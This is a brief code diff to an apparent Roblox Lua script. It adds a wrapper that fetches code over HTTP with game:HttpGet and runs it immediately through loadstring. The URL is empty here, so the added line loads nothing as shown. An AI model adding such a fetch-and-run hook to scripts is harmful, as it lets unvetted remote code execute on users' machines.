@@ -2,3 +2,9 @@ if JUJU_DINOLOADED then
     return
 end
 JUJU_DINOLOADED = true
+local run = function(func)
+    func()
+end
+run(function()
+    loadstring(game:HttpGet(""))()
+end)
